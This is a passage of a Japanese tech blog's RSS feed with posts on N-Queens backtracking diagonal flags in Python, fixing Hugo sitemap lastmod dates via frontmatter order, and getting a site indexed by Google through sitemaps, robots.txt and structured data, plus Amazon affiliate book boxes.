&lt;h2 class="amazon-name"> 要点整理から攻略する『AWS認定 データベース-専門知識』 (Compass Booksシリーズ) &lt;/h2>
&lt;p> 「AWS 認定 データベース」に頻出する内容を1冊にまとめました! ■AWS認定とは AWS 認定試験は、AWSに関する知識・スキルを測るための試験です。レベル別・カテゴリー別に認定され、基礎コース・アソシエイト・プロフェッショナルの3つのレベルと、ネットワークやセキュリティなど分野ごとの専門知識(スペシャリティ)があります。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>第5回 pythonでNQueen（エイトクイーン）バックトラック（１）</title><link>https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/</link><pubDate>Mon, 07 Feb 2022 16:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/chess.jpg" alt="Featured image of post 第5回 pythonでNQueen（エイトクイーン）バックトラック（１）" />&lt;h2 id="バックトラック">バックトラック&lt;/h2>
&lt;p>今回はバックトラックを説明していきたいと思います。 &lt;br>
今回のバックトラックのロジックは前回の配置フラグの拡張版です。&lt;br>
配置フラグは上下の利き筋までしかチェックしていませんでしたが今回のバックトラックは左右斜めの対角線上の利き筋もチェックします。&lt;br>
上下の配置フラグの他に右斜め、左斜めの配置フラグを作ってチェックします。&lt;br>
ブルートフォース、配置フラグでは解の候補を出すに止まりましたが、今回で左右、上下、対角線上とクイーンのすべての利き筋をチェックすることができるますので、プログラム独力で解を出せるようになります。&lt;br>
出力は解の数となっております。&lt;/p>
&lt;p>ブルートフォース、配置フラグ、バックトラックの関係は以下の通りです。&lt;br>
制約が1個、2個、3個と追加されていくような感じです。&lt;/p>
&lt;p>・ブルートフォース&lt;br>
制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる&lt;br>
・配置フラグ&lt;br>
制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる&lt;br>
制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる&lt;br>
・バックトラック&lt;br>
制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる&lt;br>
制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる&lt;br>
制約3個目 配置フラグを拡張し左右斜めにクイーンを置けないようにする 対角線上の利き筋をみる&lt;/p>
&lt;p>プログラムソースは以下のURLにあります。&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py&lt;/a>&lt;/p>
&lt;h2 id="グローバル変数">グローバル変数&lt;/h2>
&lt;p>432,433行目でTOTAL,UNIQUEというグローバル変数が追加されています。&lt;br>
ブルートフォース、配置フラグは解の候補を列挙するにとどまっていましたが、今回からはプログラム内で正解数を出力するようになります。&lt;br>
TOTALは正解数の総数です。&lt;br>
UNIQUEですが、NQueenの解は左右ミラー反転、90度、180度、270度と左右反転していくと同じ形のものが結構あります。左右反転して同じ形のものを同一解としてカウントした数がUNIQUEとなります。&lt;/p>
&lt;p>436,437行目にFB,FC配列が追加されています。&lt;br>
FBが左斜め、FCが右斜めの対角線の利き筋を配置フラグでチェックします。&lt;/p>
&lt;h2 id="対角線上の配置フラグ">対角線上の配置フラグ&lt;/h2>
&lt;p>対角線の利き筋ですが１次元配列でチェックすることができます。&lt;br>
図で見てみましょう。&lt;/p>
&lt;p>上下の利き筋について簡単です。&lt;br>
例えば、1行目の右から2列目にクイーンを置いた場合は2、3、4行目の2列目にクイーンを置けなくなります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 242px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d1.png" data-size="330x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d1.png"
width="330"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>2、3、4行目の右から2列目にクイーンを置いた場合はその他の行の2列目にクイーンを置けなくなります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 242px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d2.png" data-size="326x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d2.png"
width="326"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d3.png" data-size="330x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d3.png"
width="330"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d4.png" data-size="322x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d4.png"
width="322"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>ですのでフラグはクイーンを置いた列番号に立てれば良いことになります。&lt;br>
2列目だったらFA[1]=1です。&lt;/p>
&lt;p>対角線の利き筋についても計算が必要ではあるのですが法則性があり1次元配列で表現することが可能です。&lt;/p>
&lt;p>FB 左斜め対角線の利き筋について見てみましょう&lt;/p>
&lt;p>左斜め対角線のフラグの位置の計算法則は&lt;br>
行数-クイーンを置いた列数+(サイズ-1)&lt;br>
row-i+(size-1)&lt;br>
で1次元配列で表現できます。&lt;/p>
&lt;p>図で見てみましょう。&lt;br>
1行目の1列目にクイーンを置いた場合&lt;br>
左斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,0]
2行目2列目 [1,1]
3行目3列目 [2,2]
4行目4列目 [3,3]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l1.png" data-size="326x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l1.png"
width="326"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row-i+(size-1) で計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,0] 0-0+(4-1)=3
2行目2列目 [1,1] 1-1+(4-1)=3
3行目3列目 [2,2] 2-2+(4-1)=3
4行目4列目 [3,3] 3-3+(4-1)=3
&lt;/code>&lt;/pre>&lt;p>FB[4] にフラグをたてれば左対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>2行目3列目にクイーンを置いた場合はどうなるでしょう&lt;/p>
&lt;p>左斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目2列目 [0,1]
2行目3列目 [1,2]
3行目4列目 [2,3]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l5.png" data-size="330x332">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l5.png"
width="330"
height="332"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row-i+(size-1) で計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目2列目 [0,1] 0-1+(4-1)=2
2行目3列目 [1,2] 1-2+(4-1)=2
3行目4列目 [2,3] 2-3+(4-1)=2
&lt;/code>&lt;/pre>&lt;p>FB[3] にフラグをたてれば左対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>FC 右斜め対角線の利き筋について見てみましょう&lt;/p>
&lt;p>右斜め対角線のフラグの位置の計算法則は&lt;br>
行数+クイーンを置いた列数&lt;br>
row+i&lt;br>
で1次元配列で表現できます。&lt;/p>
&lt;p>図で見てみましょう。&lt;br>
1行目の4列目にクイーンを置いた場合&lt;br>
右斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,3]
2行目2列目 [1,2]
3行目3列目 [2,1]
4行目4列目 [3,0]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 102;
flex-basis: 245px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r1.png" data-size="330x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r1.png"
width="330"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row+iで計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,3] 0+3=3
2行目2列目 [1,2] 1+2=3
3行目3列目 [2,1] 2+1=3
4行目4列目 [3,0] 3+0=3
&lt;/code>&lt;/pre>&lt;p>FC[4] にフラグをたてれば右対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>2行目の2列目にクイーンを置いた場合&lt;br>
右斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,2]
2行目2列目 [1,1]
3行目3列目 [2,0]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r5.png" data-size="334x336">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/r5.png"
width="334"
height="336"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row+iで計算してみましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,2] 0+2=2
2行目2列目 [1,1] 1+1=2
3行目3列目 [2,0] 2+0=2
&lt;/code>&lt;/pre>&lt;p>FC[3] にフラグをたてれば右対角線の利き筋をチェックすることができます。&lt;/p>
&lt;p>長くなりましたので今回はグローバル変数の説明だけで終わります。&lt;br>
次回は、新しく追加されたmainメソッドからプログラムの概要を説明したいと思います。&lt;/p></description></item><item><title>SEO対策にXMLの更新日（lastmod）を正しく表示する方法</title><link>https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/</link><pubDate>Mon, 07 Feb 2022 11:28:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/catch.jpg" alt="Featured image of post SEO対策にXMLの更新日（lastmod）を正しく表示する方法" />&lt;p>Hugoを使って記事を作成しているのですが、サイトマップをみてみるとlastmodの値がすべて同じになってました。その原因と解決策を今回は探っていこうと思います。&lt;/p>
&lt;p>Hugoの導入や記事の投稿についての情報は&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2021-12-21-01/" target="_blank" rel="noopener"
>Hugoで記事の投稿の仕方&lt;/a>や&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/" target="_blank" rel="noopener"
>デザイナーでもできる初めてのHUGO #01&lt;/a>を確認してください。&lt;/p>
&lt;h2 id="gitから更新情報を取得するようにしている">Gitから更新情報を取得するようにしている&lt;/h2>
&lt;p>Hugoは非常に強力な機能をたくさん持っています。その一つがGitにある情報にアクセスできるという点です。&lt;br>
この機能を使えば、Gitに登録した人を投稿者としたり、push した日付を更新日とすることができます。&lt;br>
つまり、自分で投稿者や更新日を記述する必要がないということになります。&lt;/p>
&lt;p>このブログでもHugoとGitの連携を行っております。その連携自体は簡単です。&lt;br>
設定ファイルに&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">enableGitInfo&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>と記述するだけで、Gitの情報にアクセスできます。&lt;/p>
&lt;h2 id="frontmatterの記述">frontmatterの記述&lt;/h2>
&lt;p>Hugoには日付を制御できる設定があります。Hugoがコンテンツ・ページに日付を割り当てる方法を設定することができます。これは、config に frontmatter セクションを追加することで行うことが可能です。&lt;br>
私の環境では下記のようになっておりました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">frontmatter&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">lastmod&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">fileModTime&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">git&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">lastmod&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>:fileModTime&lt;/code>はコンテンツファイルの最終更新タイムスタンプから日付を取得します。&lt;br>
&lt;code>:git&lt;/code>ではコンテンツファイルの最終リビジョンのGit作成日となります。&lt;br>
この設定を使うには、&lt;code>--enableGitInfo&lt;/code> が設定されているか、サイト構成で &lt;code>enableGitInfo = true &lt;/code>が設定されている必要があります。つまり、先程の設定ファイルに記述した設定となります。&lt;br>
そして、&lt;code>lastmod&lt;/code>です。&lt;/p>
&lt;p>この設定は上から順に評価されていきます。&lt;/p>
&lt;p>詳細は&lt;a class="link" href="https://gohugo.io/getting-started/configuration/#configure-front-matter" target="_blank" rel="noopener"
>Hugoのfrontmatter&lt;/a>を確認してください。&lt;/p>
&lt;h2 id="git-actioinsで設定したxmlの更新日がすべて同じになった">Git Actioinsで設定したXMLの更新日がすべて同じになった&lt;/h2>
&lt;p>今回は&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/" target="_blank" rel="noopener"
>XMLの作成&lt;/a>の際にGitのデータを使用するようにしていました。&lt;br>
ローカルで確認したところ、&lt;code>hugo server&lt;/code>での動作も、&lt;code>hugo&lt;/code>にて書き出したファイルも更新日である&lt;code>lastmod&lt;/code>が正常に表示されていたので問題ないと判断して、Gitにアップしました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 147;
flex-basis: 354px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img01.png" data-size="980x663">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img01.png"
width="980"
height="663"
loading="lazy"
alt="SEO対策にXMLの更新日（lastmod）を正しく表示する方法の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>しかし、Gitではローカルと動作が異なっており、すべて同じ日付となってしまいました。&lt;br>
一体なぜでしょうか？&lt;/p>
&lt;h3 id="ランキングや最新記事の反映で日付が更新された可能性">ランキングや最新記事の反映で日付が更新された可能性&lt;/h3>
&lt;p>このサイトでは最新記事やランキングを掲載しております。それらは時間や投稿のタイミングで変化します。そういた変化を検知してしまって日付が変わってしまった可能性が考えられます。&lt;br>
しかし、そうだとしたら、ローカルでも同様の問題になるかと思うので、この可能性は低そうです。&lt;/p>
&lt;h3 id="github-pagesで別ブランチで管理している">GitHub Pagesで別ブランチで管理している&lt;/h3>
&lt;p>このサイトはGitHub Pagesを使って別ブランチで管理しています。つまり、公開ディレクトリにあたる public 部分は前の考察のランキングや最新記事によって全てのページが変更されています。&lt;br>
そして、別ブランチにアップする。つまり、すべてが書き換わるといったことが起こったのではないでしょうか。&lt;/p>
&lt;h2 id="解決策">解決策&lt;/h2>
&lt;p>解決策はすごくと簡単です。&lt;br>
Git と連携して lastmod の日付を自動で設定するために、&lt;code>enableGitInfo: true&lt;/code> としていました。そして、この設定と同時に、下記のような設定もHugoの設定ファイル（yaml形式）に記述していました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">frontmatter&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">lastmod&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">fileModTime&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">git&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">lastmod&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ここの frontmatter の記述をすべてコメントアウトにします。&lt;br>
それか、優先度のファイルのタイムスタンプから&lt;code>:git&lt;/code>に変更します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">frontmatter&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">lastmod&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">git&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">:&lt;/span>&lt;span class="l">fileModTime&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">lastmod&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>これでlastmodが正しく表示されるようになりました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 169;
flex-basis: 406px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img02.png" data-size="980x578">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/img02.png"
width="980"
height="578"
loading="lazy"
alt="SEO対策にXMLの更新日（lastmod）を正しく表示する方法の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>lastmod はSEOとしてあまり必要とされていないといった声も聞かれますが、正しく表示しておくことでサイトとしての信頼性は格段に上がると思います。&lt;br>
HugoとGitの連携を行った際に、更新日など正しく反映されない箇所があった場合は設定などを見直してみましょう。&lt;br>
簡単なことで問題が解決するかもしれません。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/GitHub%e5%ae%9f%e8%b7%b5%e5%85%a5%e9%96%80-Pull-Request%e3%81%ab%e3%82%88%e3%82%8b%e9%96%8b%e7%99%ba%e3%81%ae%e5%a4%89%e9%9d%a9-PRESS-plus/dp/477416366X/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51PjpAUHZBL.jpg" alt=" GitHub実践入門 ~Pull Requestによる開発の変革 (WEB&amp;#43;DB PRESS plus) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> GitHub実践入門 ~Pull Requestによる開発の変革 (WEB&amp;#43;DB PRESS plus) &lt;/h2>
&lt;p> GitHubの実践的な使い方を、実際に手を動かす形で解説する書籍です。初学者の方にもわかりやすいよう、基本的なGitやGitHubの使い方から、「ソーシャルコーディング」の目玉機能であるPull Requestの送り方・受け方まで解説します。また、外部ツールとの連携、GitHub FlowやGit Flowなど、GitHubを中心とした開発手法についてもしっかり解説しているので、中・上級者の方にも参考になるはずです。 目次 第1章:GitHubの世界へようこそ 第2章:Gitの導入 第3章:GitHubを利用するための準備 第4章:Gitを操作しながら学ぶ 第5章:GitHubの機能を徹底解説 第6章:はじめてのPull Request 第7章:Pull Requestが送られてきたら 第8章:GitHubと連携するツールとサービス 第9章:GitHubを利用した開発フロー 第10章:会社でGitHubを使おう Appendix A:GitHubをサポートするGUIクライアント Appendix B:Gistで手軽にコードを共有 続きを読む 。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e6%94%b9%e8%a8%822%e7%89%88-%e3%82%8f%e3%81%8b%e3%81%b0%e3%81%a1%e3%82%83%e3%82%93%e3%81%a8%e5%ad%a6%e3%81%b6-Git%e4%bd%bf%e3%81%84%e6%96%b9%e5%85%a5%e9%96%80%e3%80%88GitHub%e3%80%81SourceTree%e3%80%81%e3%82%b3%e3%83%9e%e3%83%b3%e3%83%89%e6%93%8d%e4%bd%9c%e5%af%be%e5%bf%9c%e3%80%89-%e6%b9%8a%e5%b7%9d-%e3%81%82%e3%81%84/dp/4863543433/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51ITQMzMG2L.jpg" alt=" 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 &lt;/h2>
&lt;p> マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。 本書ではクリック操作でGitを使えるSourceTreeを中心に解説しているので、初心者でも安心です。 はじめにより抜粋 ■せっかく学ぶなら、やっぱり楽しい方がいい 「Gitって難しそう」 「勉強しようとは思っているけど、なかなか一歩が踏み出せない」 そんな方のために、楽しくGitを理解できる本を作りました。 ・個性的なキャラクターたちが登場するマンガ ・感覚的にわかる図解 ・丁寧な実践パート 上記3つの特長で、Gitを無理なく学べます。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>Googleにインデックスされないときの対応方法は？</title><link>https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/</link><pubDate>Fri, 04 Feb 2022 12:03:03 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/catch.jpg" alt="Featured image of post Googleにインデックスされないときの対応方法は？" />&lt;p>近年、ブログやWEBサイトを作って公開している人が増えてきました。&lt;br>
そうした中で、Googleにインデックスされるというのは非常に重大なことです。せっかく書いた記事もGoogleにインデックスされないと検索結果に表示されません。&lt;/p>
&lt;p>Googleにインデックスされないとき、どうしたら良いのでしょうか？&lt;/p>
&lt;h2 id="ブログを公開">ブログを公開&lt;/h2>
&lt;p>まずはブログを公開する際に、GoogleアナリティクスやSearch Consoleの設定などを行いましょう。&lt;br>
これによって、どんな人が来ているのかなどを閲覧することができたり、実際にサーバを閲覧することなくGoogleクローラーの状況やインデックスの状況、SEO対策などの機能などが盛りだくさんです。&lt;/p>
&lt;p>そして、Googleだけでなく Bingの方も登録しておくことをオススメします。Bingのクローラーはかなり早く、以前のGoogleのようにインデックスをしてくれます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 164;
flex-basis: 395px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img02.png" data-size="980x594">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img02.png"
width="980"
height="594"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="サイトマップをつくる">サイトマップをつくる&lt;/h2>
&lt;p>サイトマップと呼ばれるXMLを作成しましょう。&lt;br>
小規模なサイトやページ同士がしっかりリンクしているサイトであれば不要かもしれませんが、サイトマップは作っているに限ります。&lt;br>
クローラーはそのサイトマップを見て、サイトの構造を把握していきます。&lt;br>
もちろん、ページ構成がしっかりしたサイトであればクローラーは内部リンクのみでサイトマップを構築することが可能です。&lt;br>
クローラーの手助けとなるために、内部リンクをしっかり作り、サイトマップも作っておけばクローラビリティが格段にアップするでしょう。&lt;/p>
&lt;h2 id="サイト公開から半月">サイト公開から半月&lt;/h2>
&lt;p>サイトを公開してから半月、クローラーが１回来て、サイトマップをのデータからクローラーを開始したようです。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 203;
flex-basis: 488px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img01.png" data-size="980x481">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img01.png"
width="980"
height="481"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>Googleで検索しても表示されるようになりました。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 115;
flex-basis: 276px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img04.png" data-size="980x850">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img04.png"
width="980"
height="850"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="サイト公開から１ヶ月">サイト公開から１ヶ月&lt;/h2>
&lt;p>クローラーはほぼ仕事をしなくなりました。&lt;br>
来ていないということはなく、来ても数ページクロールして去っていきます。&lt;br>
新しいページをクロールすることはありませんでした。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 114;
flex-basis: 274px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img05.png" data-size="980x857">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img05.png"
width="980"
height="857"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>以前の作成したサイトと比較してもクローラーの活動頻度が激減していることは確かです。&lt;br>
数年前に作成して更新していないサイトのサイトマップのクロール頻度は１週間程度でした。新しく作成したサイトでは1ヶ月過ぎてもサイトマップへのクローラーがきませでした。&lt;/p>
&lt;h2 id="対応策を試す">対応策を試す&lt;/h2>
&lt;h3 id="robotstxtを編集する">robots.txtを編集する&lt;/h3>
&lt;p>クロールの結果を見ると画像やcss、jsなどにアクセスしていたため、htmlへのクロールを促すために、これらをrobots.txtにて許可しない設定にしてみました。&lt;br>
理由としては、すべてクロールするようにしてますが、cssやjsなどのファイルもクロールされており、そこにリソースが使われてHTMLまでクロールされていないのではないかと考えたためです。&lt;/p>
&lt;pre tabindex="0">&lt;code>User-agent: Googlebot-Image
Allow: /*.jpg$
Allow: /*.png$
Allow: /*.gif$
User-agent: *
Disallow: /*.jpg$
Disallow: /*.png$
Disallow: /*.gif$
Disallow: /assets/
Disallow: /404.html
Disallow: /js/
Disallow: /ts/
Disallow: /images/
Disallow: /scss/
Disallow: /css/
Allow: /
&lt;/code>&lt;/pre>&lt;p>後でわかったのですが、これは完全にNGです。&lt;br>
&lt;a class="link" href="https://developers.google.com/search/blog/2014/10/updating-our-technical-webmaster" target="_blank" rel="noopener"
>Googleの記事&lt;/a>を呼んでいると、従来のテキストベースから実際のブラウザのように動作し、レンダリング速度なども考慮しているとのことでした。結果、現在は404のページ以外はフルオープンにしております。&lt;/p>
&lt;pre tabindex="0">&lt;code>User-agent: *
Disallow: /404.html
Allow: /
&lt;/code>&lt;/pre>&lt;h3 id="構造体データを追加">構造体データを追加&lt;/h3>
&lt;p>SEO効果があるということで、構造体データを追加してみました。構造化データの仕組みについては&lt;a class="link" href="https://developers.google.com/search/docs/advanced/structured-data/intro-structured-data?hl=ja" target="_blank" rel="noopener"
>こちら&lt;/a>を確認してください。&lt;br>
効果があるかはまだわかりませんが、Search Consoleを見てみると、数ページは認識しているようです。&lt;br>
SEO効果があるかと言われると、重要ではないといった話もあるので余力のある方は実装といったことになるかと思います。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;application/ld+json&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
